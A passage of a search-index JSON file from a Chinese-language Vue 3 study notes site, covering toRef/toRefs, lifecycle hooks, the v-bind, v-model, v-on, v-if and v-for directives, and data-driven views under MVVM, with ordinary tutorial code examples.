console.log(hobby); // Proxy\u5bf9\u8c61\n      // \u53ef\u4ee5\u7528\u4e0b\u6807\u4fee\u6539\n      hobby[0] = 2;\n\n      // \u60f3\u7528temp\u6570\u7ec4\u4ee3\u66ff\u5f53\u524d\u6570\u7ec4\u7684\u5185\u5bb9\uff0c\u4e0d\u80fd\u4f7f\u7528 hobby = temp;\n      let temp = [3, 2, 1];\n\n      // \u5148\u6e05\u7a7a\u6570\u7ec4\uff0c\u7136\u540e\u5c06temp\u91cc\u7684\u5185\u5bb9\u4e00\u4e2a\u4e00\u4e2apush\u8fdb\u53bb\uff0c\u6b64\u5904\u4f7f\u7528 ES6\u7684\u6269\u5c55\u7b26\u53f7\u6765\u5feb\u901f\u5b9e\u73b0\n      hobby.length = 0;\n      hobby.push(...temp);\n    }\n\n    return { name, age, job_ref, job_reactive, hobby, changeInfo };\n  },\n};\n&lt;/script&gt;\n</code></pre> <p>\u5982\u4e0a\uff0c\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a\u5bf9\u8c61 <code>job_reactive</code> \uff0c\u5728 <code>&lt;template&gt;</code> \u4e2d\u4f7f\u7528\u65f6\uff0c\u6bcf\u4e2a\u90fd\u9700\u8981\u52a0\u4e0a <code>job_reactive.</code> \u524d\u7f00\u6765\u8c03\u7528\uff0c\u975e\u5e38\u7684\u9ebb\u70e6\uff0c\u56e0\u6b64\u5f15\u5165 <code>toRef</code> \uff0c\u7528\u4e8e\u5355\u72ec\u4ea4\u51fa\u5bf9\u8c61\u4e2d\u7684\u67d0\u4e2a\u5c5e\u6027\u3002</p> toRef\u3001toRefs \u793a\u4f8b<pre><code>&lt;template&gt;\n  &lt;h1&gt;\u5de5\u4f5c\u79cd\u7c7b\uff1a{{ type }}&lt;/h1&gt;\n  &lt;h1&gt;\u5de5\u4f5c\u85aa\u6c34\uff1a{{ salary }}&lt;/h1&gt;\n  &lt;!-- toRef --&gt;\n  &lt;h1&gt;c\uff1a{{ c }}&lt;/h1&gt;\n\n  &lt;!-- toRefs --&gt;\n  &lt;h1&gt;c\uff1a{{ a.b.c }}&lt;/h1&gt;\n  &lt;button @click=\"changeInfo\"&gt;changeInfo&lt;/button&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nimport { reactive, toRef, toRefs } from \"vue\";\nexport default {\n  setup() {\n    let job = reactive({\n      type: \"\u524d\u7aef\",\n      salary: \"30k\",\n      a: {\n        b: {\n          c: 30,\n        },\n      },\n    });\n\n    // \u8fd9\u6837\u53ea\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u8d4b\u503c\uff0c\u76f8\u5f53\u4e8e let type = \"\u524d\u7aef\"\uff0c\u663e\u7136\u4e0d\u662f\u54cd\u5e94\u5f0f\u7684\u3002\n    // let type = job.type;\n\n    /** \u6ce8\u610f\uff0c\u6b64\u65f6\u7684type\u548cjob.type\u662f\u8054\u7cfb\u8d77\u6765\u7684\uff0c\u65e0\u8bba\u662f\u4fee\u6539type\u8fd8\u662fjob.type\u90fd\u662f\u76f8\u540c\u7684\n     *  toRef\u7684\u610f\u4e49\u5728\u4e8e\n     *          1. \u53ef\u4ee5\u76f4\u63a5return {type:toRef(job,\"type\")}\n     *          2. \u5982\u679c\u76f4\u63a5return {type:job.type}\u7684\u8bdd\uff0c\u5c31\u50cf\u4e0a\u9762\u8bf4\u7684\uff0c\u5c31\u662f\u76f4\u63a5\u8fd4\u56de\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32,\u56e0\u6b64\u4e0d\u662f\u54cd\u5e94\u5f0f\u7684\n     *          3. \u603b\u7ed3\uff1atoRef\u8ba9reactive\u7684\u5bf9\u8c61\u4e2d\u7684\u67d0\u4e2a\u5c5e\u6027\u53ef\u4ee5\u5355\u72ec\u62ff\u51fa\u6765\uff0c\u4fdd\u8bc1\u5b83\u662f\u54cd\u5e94\u5f0f\u7684\uff0c\u5e76\u4e14\u548c\u6e90\u6570\u636e\u5173\u8054\u8d77\u6765\u3002\n     */\n    let type = toRef(job, \"type\");\n    let salary = toRef(job, \"salary\");\n    let c = toRef(job.a.b, \"c\");\n    console.log(type); // ObjectRefImpl\uff0c\u548cRefImpl\u7c7b\u4f3c\uff0c\u9700\u8981\u901a\u8fc7.value\u6765\u53d6\u503c\n\n    function changeInfo() {\n      // \u6b64\u65f6\u4fee\u6539salary\u6709\u4e24\u79cd\u65b9\u5f0f\n      salary.value = \"40k\";\n      job.salary = \"40k\";\n    }\n\n    return { changeInfo, type, salary, c };\n\n    /** \u4e0d\u5728\u5916\u5b9a\u4e49let type = toRef(job, \"type\"); \u76f4\u63a5\u8fd4\u56de\n      return {\n      changeInfo,\n      type: toRef(job, \"type\"),\n      salary: toRef(job, \"salary\"),\n      c: toRef(job.a.b, \"salary\"),\n    };\n     */\n\n    // \u4e0a\u8ff0\u7684\u65b9\u6cd5\u8fd8\u662f\u6bd4\u8f83\u9ebb\u70e6\uff0c\u56e0\u4e3a\u8981\u5199\u591a\u6b21 toRef\u3002\u5f15\u5165 toRefs\uff0c\u53ef\u6279\u91cf\u3002\n\n    let x = toRefs(job);\n    console.log(x); //ObjectRefImpl\uff0c\u662f\u4e00\u4e2a\u548cjob\u7c7b\u4f3c\u7684\u5bf9\u8c61\n\n    // ES6\u8bed\u6cd5\uff0c\u76f8\u5f53\u4e8e\u628a\u6bcf\u4e2a key:value \u5206\u522b\u4f20\u5165\u3002\n    // \u6ce8\u610f\uff1a\u5b58\u5728\u5d4c\u5957job.a.b.c \u800ctoRefs\u7684key\u90fd\u662f\u7b2c\u4e00\u5c42\u7684\uff0c\u4e5f\u5c31\u662fjob.a\u3002\u56e0\u6b64\u5728\u5916\u9762\u4f7f\u7528\u65f6\u9700\u8981 a.b.c\n    return { ...toRefs(job) };\n  },\n};\n&lt;/script&gt;\n</code></pre>"},{"location":"web/vue/api/#_4","title":"\u751f\u547d\u5468\u671f\u94a9\u5b50\u51fd\u6570","text":"<p>\u5728\u9009\u9879\u5f0f API \u4e2d\uff0c\u6709\u8bf8\u5982 created\u3001mounted \u7b49\u94a9\u5b50\u51fd\u6570\uff0c\u5728\u7ec4\u4ef6\u5f0f API \u4e2d\uff0c\u53ef\u4ee5\u5728 setup \u5185\u90e8\u901a\u8fc7\u5199 onMounted \u7b49\u94a9\u5b50\u51fd\u6570\uff0c\u6765\u5b9e\u73b0\u76f8\u540c\u7684\u529f\u80fd\u3002</p> <p>Note</p> <p>\u6ce8\u610f\uff1asetup \u4e2d\u6ca1\u6709 beforeCreate \u548c created \u8fd9\u4e24\u79cd\u94a9\u5b50\u51fd\u6570\uff0c\u5176\u4f59\u90fd\u7528 <code>onX</code> \u6765\u8868\u793a\uff0c\u5373\u524d\u9762\u52a0 <code>on</code> \u524d\u7f00\uff0c\u7136\u540e\u9996\u5b57\u6bcd\u53d8\u5927\u5199\u3002</p> <p>\u53c2\u89c1\uff1a\u751f\u547d\u5468\u671f\u94a9\u5b50</p>"},{"location":"web/vue/api/#_5","title":"\u5904\u7406\u6570\u636e","text":"<ul> <li>\u5728\u9009\u9879\u5f0f API \u4e2d\uff0c\u6211\u4eec\u5728 data()\u4e2d\u5b9a\u4e49\u54cd\u5e94\u5f0f\u6570\u636e\uff0c\u800c\u7ec4\u4ef6\u5f0f API \u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\u53d8\u91cf\uff0c\u7136\u540e\u4f7f\u7528\u54cd\u5e94\u5f0f API \u5c06\u5176\u8f6c\u5316\u4e3a\u54cd\u5e94\u5f0f\u53d8\u91cf\u3002</li> <li>\u540c\u7406\uff0cmethods \u9009\u9879\u4e5f\u65e0\u9700\u4f7f\u7528\uff0c\u56e0\u4e3a\u53ef\u4ee5\u76f4\u63a5\u4e66\u5199\u65b9\u6cd5\u3002</li> <li>watch \u548c computed \u4e0e\u524d\u4e24\u8005\u4e0d\u540c\uff0c\u4e8c\u8005\u5982\u679c\u8981\u5728 setup \u5185\u4f7f\u7528\uff0c\u9700\u8981\u5bfc\u5165\u3002</li> </ul>"},{"location":"web/vue/api/#_6","title":"\u5bfc\u5165\u4f9d\u8d56","text":"<p>\u5728 setup \u4e2d\u60f3\u8981\u4f7f\u7528</p> <ul> <li>onMounted \u7b49\u94a9\u5b50\u51fd\u6570</li> <li>watch\u3001computed \u7b49\u5904\u7406\u6570\u636e\u7684\u51fd\u6570</li> <li>ref\u3001reactive\u3001toRef \u7b49\u54cd\u5e94\u5f0f\u6570\u636e\u7684\u51fd\u6570</li> </ul> <p>\u5fc5\u987b\u8981\u5148\u5bfc\u5165\uff1a</p> <pre><code>&lt;script&gt;\nimport { ref, onMounted, watch, computed } from 'vue'\nexport default {\n    setup(){\n        // use ref\u3001watch\u3001onCreated\n    }\n}\n&lt;/script&gt;\n</code></pre>"},{"location":"web/vue/api/#setup-return","title":"setup return{}","text":"<p>\u5df2\u77e5 setup \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5982\u679c\u60f3\u8981\u5728 <code>&lt;template&gt;</code> \u4e2d\u4f7f\u7528 setup \u4e2d\u5b9a\u4e49\u7684\u54cd\u5e94\u5f0f\u53d8\u91cf\u3001\u8ba1\u7b97\u5c5e\u6027\u3001\u65b9\u6cd5\u7b49\uff0c\u5fc5\u987b\u8981\u5c06\u5176\u8fd4\u56de\u3002</p> <pre><code>setup(){\n    const name = ref(\"\")\n    funciton changeName(){}\n    return { name, changeName }\n}\n</code></pre>"},{"location":"web/vue/directive/","title":"\u6307\u4ee4","text":""},{"location":"web/vue/directive/#v-bind","title":"v-bind","text":"<p><code>v-bind</code> \u6307\u4ee4\u7528\u4e8e\u6570\u636e \u5355\u5411\u7ed1\u5b9a\uff0c\u5c06 data()\u4e2d\u5b9a\u4e49\u7684\u6570\u636e\u7ed1\u5b9a\u5230\u9875\u9762\u4e0a\u3002\u5373 <code>data()\u2192 \u9875\u9762</code> \u3002</p> <pre><code>&lt;!-- \u5b8c\u6574\u8bed\u6cd5 --&gt;\n&lt;a v-bind:href=\"url\"&gt; ... &lt;/a&gt;\n\n&lt;!-- \u7f29\u5199 --&gt;\n&lt;a :href=\"url\"&gt; ... &lt;/a&gt;\n\n&lt;!-- \u52a8\u6001\u53c2\u6570\u7684\u7f29\u5199 --&gt;\n&lt;a :[key]=\"url\"&gt; ... &lt;/a&gt;\n\ndata(){\n    return {\n        url:\"www.leqing.online\"\n    }\n}\n</code></pre>"},{"location":"web/vue/directive/#v-model","title":"v-model","text":"<p><code>v-model</code> \u6307\u4ee4\u7528\u4e8e\u6570\u636e \u53cc\u5411\u7ed1\u5b9a\uff0c\u53ea\u80fd\u5e94\u7528\u4e8e\u8868\u5355\u7c7b\u5143\u7d20\uff08\u8f93\u5165\u7c7b\u5143\u7d20)\uff1a</p> <ul> <li><code>&lt;input&gt;</code> \uff0c\u6839\u636e <code>type=\"xxx\"</code> \u7684\u4e0d\u540c\uff0c\u5206\u4e3a\uff1a</li> <li>\u6587\u672c\u6846\uff1atext</li> <li>\u5bc6\u7801\uff1apassword</li> <li>\u5355\u9009\uff1aradio\uff0c\u9700\u8981\u4e3a\u591a\u4e2a radio \u8d4b\u4e0a\u540c\u4e00\u4e2a name\u3002</li> <li>\u591a\u9009\uff1acheckbox</li> <li><code>&lt;select&gt;</code> \uff1a\u4e0b\u62c9\u9009\u9879\u6846</li> <li><code>&lt;textarea&gt;</code> \uff1a\u591a\u884c\u8f93\u5165</li> <li>components</li> </ul> <pre><code>&lt;div&gt;\n    \u5355\u5411\u6570\u636e\u7ed1\u5b9a\uff1a&lt;input type=\"text\" v-bind:value=\"name\"&gt;&lt;br/&gt;\n    \u53cc\u5411\u6570\u636e\u7ed1\u5b9a\uff1a&lt;input type=\"text\" v-model:value=\"name\"&gt;&lt;br/&gt;\n    &lt;!-- value\u53ef\u4ee5\u7701\u7565 --&gt;\n    \u53cc\u5411\u6570\u636e\u7ed1\u5b9a\uff1a&lt;input type=\"text\" v-model=\"name\"&gt;&lt;br/&gt;\n\n    &lt;!-- \u5f53v-model\u4f7f\u7528\u5728\u975e\u8868\u5355\u7c7b\u5143\u7d20\u4e0a\u65f6\uff0c\u62a5\u9519 --&gt;\n    &lt;h2 vmodel:x=\"name\"&gt;\u4f60\u597d&lt;/h2&gt;\n&lt;/div&gt;\n\ndata(){\n    return {\n        name:\"xxx\"\n    }\n}\n</code></pre>"},{"location":"web/vue/directive/#_2","title":"\u6536\u96c6\u6570\u636e","text":"<p><code>v-model</code>\u00a0 \u5728\u5185\u90e8\u4e3a\u4e0d\u540c\u7684\u8f93\u5165\u5143\u7d20\u4f7f\u7528\u4e0d\u540c\u7684 property \u5e76\u629b\u51fa\u4e0d\u540c\u7684\u4e8b\u4ef6\uff1a</p> <ul> <li>text \u548c textarea \u5143\u7d20\u4f7f\u7528 \u00a0<code>value</code>\u00a0property \u548c \u00a0<code>input</code>\u00a0 \u4e8b\u4ef6\uff1b</li> <li>checkbox \u548c radio \u4f7f\u7528 \u00a0<code>checked</code>\u00a0property \u548c \u00a0<code>change</code>\u00a0 \u4e8b\u4ef6\uff1b</li> <li>select \u5b57\u6bb5\u5c06 \u00a0<code>value</code>\u00a0 \u4f5c\u4e3a prop \u5e76\u5c06 \u00a0<code>change</code>\u00a0 \u4f5c\u4e3a\u4e8b\u4ef6\u3002</li> </ul>"},{"location":"web/vue/directive/#v-on","title":"v-on","text":"<p><code>v-on</code>\u6307\u4ee4\uff0c\u5b83\u7528\u4e8e\u76d1\u542c DOM \u4e8b\u4ef6\uff0c\u5728\u8fd9\u91cc\u53c2\u6570\u662f\u76d1\u542c\u7684\u4e8b\u4ef6\u540d\u3002</p> <pre><code>&lt;!-- \u5b8c\u6574\u8bed\u6cd5 --&gt;\n&lt;a v-on:click=\"doSomething\"&gt; ... &lt;/a&gt;\n\n&lt;!-- \u7f29\u5199 --&gt;\n&lt;a @click=\"doSomething\"&gt; ... &lt;/a&gt;\n\n&lt;!-- \u52a8\u6001\u53c2\u6570\u7684\u7f29\u5199 --&gt;\n&lt;a @[event]=\"doSomething\"&gt; ... &lt;/a&gt;\n\nmethods:{\n    click(){\n        // xxx\n    },\n    click_times(num,event){\n        // click num\u6b21\n    }\n}\n// \u4f20\u5165\u53c2\u6570num\u548cevent\n&lt;a @click_times=\"doSomething(3,$event)\"&gt; ... &lt;/a&gt;\n</code></pre> <p>\u52a8\u6001\u53c2\u6570\uff1a\u8fd9\u91cc\u7684 <code>[key]\u548c[event]</code> \u4f1a\u88ab\u4f5c\u4e3a\u4e00\u4e2a JavaScript \u8868\u8fbe\u5f0f\u8fdb\u884c\u52a8\u6001\u6c42\u503c\uff0c\u6c42\u5f97\u7684\u503c\u5c06\u4f1a\u4f5c\u4e3a\u6700\u7ec8\u7684\u53c2\u6570\u6765\u4f7f\u7528\u3002</p> <p>\u6bd4\u5982\uff0c\u5f53 \u00a0<code>event</code>\u00a0 \u7684\u503c\u4e3a \u00a0<code>\"focus\"</code>\u00a0 \u65f6\uff0c<code>v-on:[event]</code>\u00a0 \u5c06\u7b49\u4ef7\u4e8e \u00a0<code>v-on:focus</code></p>"},{"location":"web/vue/directive/#_3","title":"\u4fee\u9970\u7b26","text":"<p>\u4fee\u9970\u7b26 (modifier) \u662f\u4ee5\u534a\u89d2\u53e5\u53f7 \u00a0<code>.</code>\u00a0 \u6307\u660e\u7684\u7279\u6b8a\u540e\u7f00\uff0c\u7528\u4e8e\u6307\u51fa\u4e00\u4e2a\u6307\u4ee4\u5e94\u8be5\u4ee5\u7279\u6b8a\u65b9\u5f0f\u7ed1\u5b9a\u3002</p> <p>\u4e8b\u4ef6\u4fee\u9970\u7b26\u5982\uff1a</p> <pre><code>&lt;!-- \u963b\u6b62\u5355\u51fb\u4e8b\u4ef6\u7ee7\u7eed\u5192\u6ce1 --&gt;\n&lt;a @click.stop=\"doThis\"&gt;&lt;/a&gt;\n\n&lt;!-- \u63d0\u4ea4\u4e8b\u4ef6\u4e0d\u518d\u91cd\u8f7d\u9875\u9762 --&gt;\n&lt;form @submit.prevent=\"onSubmit\"&gt;&lt;/form&gt;\n\n&lt;!-- \u4fee\u9970\u7b26\u53ef\u4ee5\u4e32\u8054 --&gt;\n&lt;a @click.stop.prevent=\"doThat\"&gt;&lt;/a&gt;\n\n&lt;!-- \u53ea\u6709\u4fee\u9970\u7b26 --&gt;\n&lt;form @submit.prevent&gt;&lt;/form&gt;\n\n&lt;!-- \u6dfb\u52a0\u4e8b\u4ef6\u76d1\u542c\u5668\u65f6\u4f7f\u7528\u4e8b\u4ef6\u6355\u83b7\u6a21\u5f0f --&gt;\n&lt;!-- \u5373\u5185\u90e8\u5143\u7d20\u89e6\u53d1\u7684\u4e8b\u4ef6\u5148\u5728\u6b64\u5904\u7406\uff0c\u7136\u540e\u624d\u4ea4\u7531\u5185\u90e8\u5143\u7d20\u8fdb\u884c\u5904\u7406 --&gt;\n&lt;div @click.capture=\"doThis\"&gt;...&lt;/div&gt;\n\n&lt;!-- \u53ea\u5f53\u5728 event.target \u662f\u5f53\u524d\u5143\u7d20\u81ea\u8eab\u65f6\u89e6\u53d1\u5904\u7406\u51fd\u6570 --&gt;\n&lt;!-- \u5373\u4e8b\u4ef6\u4e0d\u662f\u4ece\u5185\u90e8\u5143\u7d20\u89e6\u53d1\u7684 --&gt;\n&lt;div @click.self=\"doThat\"&gt;...&lt;/div\n</code></pre> <p><code>click</code> \u4e8b\u4ef6\u5e38\u7528\u7684\u6709\uff1a</p> <ul> <li><code>prevent</code> \uff1a\u963b\u6b62\u9ed8\u8ba4\u4e8b\u4ef6</li> <li><code>stop</code>\uff1a\u7ec4\u7ec7\u4e8b\u4ef6\u5192\u6ce1</li> <li><code>once</code>\uff1a\u4e8b\u4ef6\u53ea\u89e6\u53d1\u4e00\u6b21</li> </ul> <p><code>keyon</code>\u3001 <code>keydown</code> \u4f7f\u7528\u6309\u952e\u4fee\u9970\u7b26\u548c\u7cfb\u7edf\u4fee\u9970\u7b26\u3002</p> <p>\u6309\u952e\u4fee\u9970\u7b26\uff1a</p> <ul> <li><code>.enter</code></li> <li><code>.tab</code></li> <li><code>.delete</code>\u00a0(\u6355\u83b7\u201c\u5220\u9664\u201d\u548c\u201c\u9000\u683c\u201d\u952e)</li> <li><code>.esc</code></li> <li><code>.space</code></li> <li><code>.up</code></li> <li><code>.down</code></li> <li><code>.left</code></li> <li><code>.right</code></li> </ul> <p>\u7cfb\u7edf\u4fee\u9970\u7b26\uff1a</p> <ul> <li><code>.ctrl</code></li> <li><code>.alt</code></li> <li><code>.shift</code></li> <li><code>.meta</code></li> </ul>"},{"location":"web/vue/directive/#v-if","title":"v-if","text":"<p>\u7528\u4e8e\u6761\u4ef6\u6027\u5730\u6e32\u67d3\u4e00\u5757\u5185\u5bb9\u3002\u8fd9\u5757\u5185\u5bb9\u53ea\u4f1a\u5728\u6307\u4ee4\u7684\u8868\u8fbe\u5f0f\u8fd4\u56de truthy \u503c\u7684\u65f6\u5019\u88ab\u6e32\u67d3\u3002</p> <pre><code>&lt;div v-if=\"type === 'A'\"&gt;A&lt;/div&gt;\n&lt;div v-else-if=\"type === 'B'\"&gt;B&lt;/div&gt;\n&lt;div v-else-if=\"type === 'C'\"&gt;C&lt;/div&gt;\n&lt;div v-else&gt;Not A/B/C&lt;/div&gt;\n</code></pre> <p>v-show \u548c v-if \u975e\u5e38\u76f8\u4f3c\u3002</p> <p><code>v-if</code>\u00a0 \u662f\u201c\u771f\u6b63\u201d\u7684\u6761\u4ef6\u6e32\u67d3\uff0c\u56e0\u4e3a\u5b83\u4f1a\u786e\u4fdd\u5728\u5207\u6362\u8fc7\u7a0b\u4e2d\uff0c\u6761\u4ef6\u5757\u5185\u7684\u4e8b\u4ef6\u76d1\u542c\u5668\u548c\u5b50\u7ec4\u4ef6\u9002\u5f53\u5730\u88ab\u9500\u6bc1\u548c\u91cd\u5efa\u3002</p> <p><code>v-if</code>\u00a0 \u4e5f\u662f**\u60f0\u6027\u7684**\uff1a\u5982\u679c\u5728\u521d\u59cb\u6e32\u67d3\u65f6\u6761\u4ef6\u4e3a\u5047\uff0c\u5219\u4ec0\u4e48\u4e5f\u4e0d\u505a\u2014\u2014\u76f4\u5230\u6761\u4ef6\u7b2c\u4e00\u6b21\u53d8\u4e3a\u771f\u65f6\uff0c\u624d\u4f1a\u5f00\u59cb\u6e32\u67d3\u6761\u4ef6\u5757\u3002</p> <p>\u76f8\u6bd4\u4e4b\u4e0b\uff0c<code>v-show</code>\u00a0 \u5c31\u7b80\u5355\u5f97\u591a\u2014\u2014\u4e0d\u7ba1\u521d\u59cb\u6761\u4ef6\u662f\u4ec0\u4e48\uff0c\u5143\u7d20\u603b\u662f\u4f1a\u88ab\u6e32\u67d3\uff0c\u5e76\u4e14\u53ea\u662f\u7b80\u5355\u5730\u57fa\u4e8e CSS \u8fdb\u884c\u5207\u6362\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c<code>v-if</code>\u00a0 \u6709\u66f4\u9ad8\u7684\u5207\u6362\u5f00\u9500\uff0c\u800c \u00a0<code>v-show</code>\u00a0 \u6709\u66f4\u9ad8\u7684\u521d\u59cb\u6e32\u67d3\u5f00\u9500\u3002\u56e0\u6b64\uff0c\u5982\u679c\u9700\u8981\u975e\u5e38\u9891\u7e41\u5730\u5207\u6362\uff0c\u5219\u4f7f\u7528 \u00a0<code>v-show</code>\u00a0 \u8f83\u597d\uff1b\u5982\u679c\u5728\u8fd0\u884c\u65f6\u6761\u4ef6\u5f88\u5c11\u6539\u53d8\uff0c\u5219\u4f7f\u7528 \u00a0<code>v-if</code>\u00a0 \u8f83\u597d\u3002</p>"},{"location":"web/vue/directive/#v-for","title":"v-for","text":"<p>\u5f53 \u00a0<code>v-if</code>\u00a0 \u4e0e \u00a0<code>v-for</code>\u00a0 \u4e00\u8d77\u4f7f\u7528\u65f6\uff0c<code>v-if</code>\u00a0 \u5177\u6709\u6bd4 \u00a0<code>v-for</code>\u00a0 \u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u56e0\u6b64\u4e0d\u63a8\u8350\u4e8c\u8005\u4e00\u8d77\u4f7f\u7528\u3002</p> <p>v-for \u53ef\u4ee5\u904d\u5386 data()\u4e2d\u5b9a\u4e49\u7684\u6570\u7ec4\u3001\u5bf9\u8c61\u3001\u5b57\u7b26\u4e32\u6216\u81ea\u7136\u6570\u3002</p> <p>\u6ce8\u610f\uff0c\u9700\u8981\u6307\u5b9a <code>:key</code> \uff0c\u4f5c\u4e3a\u865a\u62df DOM \u7684\u6807\u8bc6\uff0c\u5f53\u6570\u636e\u53d1\u751f\u53d8\u5316\u65f6\uff0cVue \u4f1a\u6839\u636e\u65b0\u6570\u636e\u751f\u6210\u65b0\u7684\u865a\u62df DOM\uff0c\u968f\u540e Vue \u8fdb\u884c\u65b0\u65e7\u865a\u62df DOM \u7684\u5dee\u5f02\u6bd4\u8f83\uff1a</p> <ul> <li>\u65e7\u865a\u62df DOM \u4e2d\u627e\u5230\u4e86\u4e0e\u65b0\u865a\u62df DOM \u76f8\u540c\u7684 key\uff0c\u82e5\u865a\u62df DOM \u4e2d\u5185\u5bb9\u672a\u53d8\u5316\uff0c\u76f4\u63a5\u4f7f\u7528\u4e4b\u524d\u7684\u771f\u662f DOM\uff0c\u5426\u5219\u751f\u6210\u65b0\u7684\u771f\u662f DOM\u3002</li> <li>\u82e5\u6ca1\u6709\u627e\u5230\u76f8\u540c key \u7684\u65e7\u865a\u62df DOM\uff0c\u76f4\u63a5\u521b\u5efa\u65b0\u7684\u771f\u5b9e DOM\uff0c\u968f\u540e\u6e32\u67d3\u5230\u65b0\u9875\u9762\u3002</li> </ul> <p>\u56e0\u6b64\uff0c\u4f7f\u7528 <code>:key</code> \u9996\u5148\u53ef\u4ee5\u52a0\u5feb\u6e32\u67d3\u901f\u5ea6\u3002</p> <p>\u4f46\u5982\u679c\u5bf9\u6570\u636e\u5b58\u5728\u9006\u5e8f\u6dfb\u52a0\u3001\u9006\u5e8f\u5220\u9664\u7b49\u7834\u574f\u987a\u5e8f\u5730\u64cd\u4f5c\uff0c\u4f7f\u7528 <code>index</code> \u4f5c\u4e3a <code>key</code> \u4f1a\u9020\u6210\u6e32\u67d3\u6548\u7387\u4f4e\uff0c\u751a\u81f3\u5982\u679c\u5305\u542b\u4e86\u8f93\u5165\u7c7b\u7684 DOM\uff0c\u4f1a\u51fa\u73b0\u9519\u8bef\u7684 DOM \u6e32\u67d3\u95ee\u9898\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u6700\u597d\u4f7f\u7528\u6bcf\u6761\u6570\u636e\u7684\u552f\u4e00\u6807\u8bc6\u4f5c\u4e3a key\uff0c\u5982 id\u3001\u8eab\u4efd\u8bc1\u53f7\u7b49\u552f\u4e00\u503c\u3002</p> <p>\u4e0d\u8fc7\u5982\u679c\u4e0d\u5b58\u5728\u9006\u5e8f\u6dfb\u52a0\u3001\u9006\u5e8f\u5220\u9664\u7b49\u64cd\u4f5c\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 index \u4f5c\u4e3a key\uff0c\u4e5f\u4e0d\u4f1a\u6709\u95ee\u9898\u3002</p> <pre><code>&lt;div&gt;\n&lt;h2&gt;\u904d\u5386\u6570\u7ec4&lt;/h2&gt;\n&lt;ul&gt;\n  &lt;li v-for=\"(p,index) in persons\" :key=\"index\"&gt;\n    \u59d3\u540d\uff1a{{ p.name }} \u5e74\u9f84\uff1a{{p.age}}\n  &lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;h2&gt;\u904d\u5386\u5bf9\u8c61&lt;/h2&gt;\n&lt;ul&gt;\n  &lt;li v-for=\"(value,key) in car\" :key=\"key\"&gt;\n    {{key}} : {{value}}\n  &lt;/li&gt;\n&lt;/ul&gt;\n&lt;/div&gt;\n\n&lt;h2&gt;\u904d\u5386\u5b57\u7b26\u4e32&lt;/h2&gt;\n&lt;ul&gt;\n  &lt;li v-for=\"(char,index) in str\" :key=\"index\"&gt;\n    {{index}} : {{char}}\n  &lt;/li&gt;\n&lt;/ul&gt;\n&lt;/div&gt;\n\n&lt;h2&gt;\u904d\u5386\u6307\u5b9a\u6b21\u6570&lt;/h2&gt;\n&lt;ul&gt;\n  &lt;li v-for=\"(number,index) in 3\" :key=\"index\"&gt;\n    {{number}} : {{index}}\n  &lt;/li&gt;\n&lt;/ul&gt;\n&lt;/div&gt;\n\n&lt;!-- \u904d\u5386\u4e09\u6b21\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a\n1:0\n2:1\n3:2\n--&gt;\n\ndata() {\n  return {\n        persons:[\n                {id:1,name:\"\u5f20\u4e09\",age:18},\n                {id:2,name:\"\u674e\u56db\",age:22},\n                {id:3,name:\"\u738b\u4e94\",age:23}\n        ],\n    car:{\n                name:\"\u5965\u8feaA4\",\n                price:\"20w\",\n                color:\"black\"\n        },\n        str:\"hello\"\n  }\n}\n</code></pre>"},{"location":"web/vue/mvvm/","title":"Vue \u6846\u67b6: MMVM","text":""},{"location":"web/vue/mvvm/#_1","title":"\u7406\u89e3\u6570\u636e\u9a71\u52a8\u89c6\u56fe","text":"<p>Vue \u4e00\u4e2a\u6838\u5fc3\u601d\u60f3\u662f\u6570\u636e\u9a71\u52a8\u3002\u6240\u8c13\u6570\u636e\u9a71\u52a8\uff0c\u662f\u6307\u89c6\u56fe\u662f\u7531\u6570\u636e\u9a71\u52a8\u751f\u6210\u7684\uff0c\u6211\u4eec\u5bf9\u89c6\u56fe\u7684\u4fee\u6539\uff0c\u4e0d\u4f1a\u76f4\u63a5\u64cd\u4f5c DOM\uff0c\u800c\u662f\u901a\u8fc7\u4fee\u6539\u6570\u636e\uff0c\u6765\u5b9e\u73b0\u5bf9 DOM \u7684\u64cd\u4f5c\u3002</p> <p>Example from Vue 3.0 \u5b98\u65b9\u6587\u6863 <pre><code>// HTML\n&lt;div id=\"counter\"&gt;\n  Counter: {{ counter }}\n&lt;/div&gt;\n\n// JavaScript vue\u5b9e\u73b0\n&lt;script&gt;\nconst Counter = {\n    // Counter\u662f\u4e2a\u5bf9\u8c61\uff0c\u5176\u5c5e\u6027\u5e94\u4e3akv\u952e\u503c\u5bf9\uff0c\u5373data:function(){}\u3002\u5728EC6\u4e2d\u53ef\u4ee5\u7f29\u5199\u4e3adata(){}\n  data() {\n    return {\n      counter: 0\n    }\n  },\n  mounted() {\n    setInterval(() =&gt; {\n      this.counter++\n    }, 1000)\n  }\n}\nVue.createApp(Counter).mount('#counter')\n&lt;/script&gt;\n</code></pre></p> <p>\u6b64\u5904\u6ca1\u6709\u64cd\u4f5c DOM\uff0c\u800c\u4ec5\u4ec5\u662f\u4fee\u6539\u6570\u636e counter \u7684\u503c\uff0c\u5c31\u5b9e\u73b0\u4e86\u8ba1\u65f6\u5668\u7684\u6548\u679c\u3002\u5982\u679c\u4f7f\u7528\u539f\u751f JS \u5b9e\u73b0\uff0c\u5e94\u4e3a\uff1a</p> <pre><code>&lt;div id=\"counter\"&gt;&lt;/div&gt;\n&lt;script&gt;\n    let num = 0;\n    setInterval(() =&gt; {\n      num++;\n      document.getElementById(\"counter\").innerText = \"\";\n      document.getElementById(\"counter\").innerText = \"counter:\" + num;\n    }, 1000);\n&lt;/script&gt;\n</code></pre> <p>\u5176\u672c\u8d28\u4e0a\u662f Vue \u5e2e\u52a9\u6211\u4eec\u505a\u4e86\u5bf9 DOM \u7684\u76f8\u5173\u64cd\u4f5c\u3002</p>"},{"location":"web/vue/mvvm/#mvvm","title":"MVVM","text":"<p>\u7531\u6b64\uff0c\u6211\u4eec\u5f15\u5165\u524d\u7aef\u7684\u7ecf\u5178\u6846\u67b6 